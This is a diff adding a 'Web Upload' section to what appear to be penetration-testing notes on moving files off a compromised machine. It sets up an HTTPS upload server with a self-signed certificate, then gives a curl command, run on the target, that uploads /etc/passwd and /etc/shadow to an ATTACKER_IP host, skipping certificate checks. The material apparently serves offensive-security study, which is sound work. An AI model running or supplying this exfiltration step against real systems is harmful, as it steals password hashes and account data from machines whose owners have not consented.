@@ -88,4 +88,30 @@ scp plaintext@192.168.49.128:/root/myroot.txt .
 ```
 
 
+#### Web Upload
 
+**Start Web Server**
+```
+sudo python3 -m pip install --user uploadserver
+```
+
+**Now Create a Self Signed Certificate**
+```
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+
+**Start the Web Server** - here we're making a directory to host the server
+```
+mkdir https && cd https
+```
+
+```
+sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
+```
+
+From the target/compromised machine upload the /etc/passwd and /etc/shadow files
+
+```
+curl -X POST https://ATTACKER_IP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+	- used the --insecure option because we used a self-signed cert we trust
